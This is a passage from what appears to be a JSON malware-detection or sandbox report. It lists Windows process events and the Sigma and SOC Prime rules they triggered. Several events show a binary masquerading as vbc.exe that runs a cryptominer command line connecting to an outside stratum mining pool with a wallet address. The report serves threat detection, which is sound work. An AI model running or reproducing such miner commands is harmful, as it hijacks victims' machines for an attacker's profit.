                                "IntegrityLevel": "High",
                                "ParentCommandLine": "\"C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\cvtres.exe\"",
                                "UtcTime": "1670342003",
                                "RuleName": "-"
                            }
                        },
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-657C-638F-910A-000000004700}",
                                "ProcessId": "252",
                                "Product": "Microsoft\\xae Visual Studio\\xae 2005",
                                "Description": "Visual Basic Command Line Compiler",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-6576-638F-890A-000000004700}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=C63ED21D5706A527419C9FBD730FFB2E,SHA256=EDC4DE60FDC6757EC01BFC86B1E3B54398F5E01D31E881AEBDFB5CC945629E80,IMPHASH=5B989C7F24F9B07840E9A2A654544C93",
                                "OriginalFileName": "vbc.exe",
                                "ParentImage": "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\cvtres.exe",
                                "FileVersion": "8.0.50727.8922",
                                "ParentProcessId": "2980",
                                "CurrentDirectory": "C:\\Users\\george\\AppData\\Roaming\\",
                                "CommandLine": "\"C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe\" --scrypt -o stratum+tcp://middlecoin.com:3333 -u 1NHH8wDYbJK4jWzvZoAZVKdvdJPDDgBAsP -p x -I d",
                                "EventID": "1",
                                "LogonGuid": "C784477D-FE75-6385-9A83-040000000000",
                                "LogonId": "295834",
                                "Image": "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "\"C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\cvtres.exe\"",
                                "UtcTime": "1670342012",
                                "RuleName": "-"
                            }
                        }
                    ]
                },
                {
                    "rule_level": "high",
                    "rule_id": "6bbafdf03b2a79de4fa71f3fec777333b907de6172939c7a35b5bed23d4a4b82",
                    "rule_source": "Sigma Integrated Rule Set (GitHub)",
                    "rule_title": "Potential Crypto Mining Activity",
                    "rule_description": "Detects command line parameters or strings often used by crypto miners",
                    "rule_author": "Florian Roth (Nextron Systems)",
                    "match_context": [
                        {
                            "values": {
                                "CommandLine": "\"C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe\" --scrypt -o stratum+tcp://middlecoin.com:3333 -u 1NHH8wDYbJK4jWzvZoAZVKdvdJPDDgBAsP -p x -I d",
                                "Image": "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe",
                                "EventID": "1"
                            }
                        }
                    ]
                },
                {
                    "rule_level": "medium",
                    "rule_id": "7f5e752d29abb27ef7222f5171fe6719092aa64cb1a11187e75e3efd277216b3",
                    "rule_source": "SOC Prime Threat Detection Marketplace",
                    "rule_title": "vbc.exe execution.",
                    "rule_description": "Detects use of vbc.exe as a living off the land technique.",
                    "rule_author": "Den iuzvyk",
                    "match_context": [
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-6565-638F-780A-000000004700}",
                                "ProcessId": "3124",
                                "Product": "Microsoft\\xae Visual Studio\\xae 2005",
                                "Description": "Visual Basic Command Line Compiler",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-655F-638F-700A-000000004700}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=C63ED21D5706A527419C9FBD730FFB2E,SHA256=EDC4DE60FDC6757EC01BFC86B1E3B54398F5E01D31E881AEBDFB5CC945629E80,IMPHASH=5B989C7F24F9B07840E9A2A654544C93",
                                "OriginalFileName": "vbc.exe",
                                "ParentImage": "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\cvtres.exe",
                                "FileVersion": "8.0.50727.8922",
                                "ParentProcessId": "6000",
                                "CurrentDirectory": "C:\\Users\\george\\Desktop\\",
                                "CommandLine": "\"C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe\" --scrypt -o stratum+tcp://middlecoin.com:3333 -u 1NHH8wDYbJK4jWzvZoAZVKdvdJPDDgBAsP -p x -I d",
                                "EventID": "1",
                                "LogonGuid": "C784477D-FE75-6385-9A83-040000000000",
                                "LogonId": "295834",
                                "Image": "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "\"C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\cvtres.exe\"",
                                "UtcTime": "1670341989",
                                "RuleName": "-"
                            }
                        },
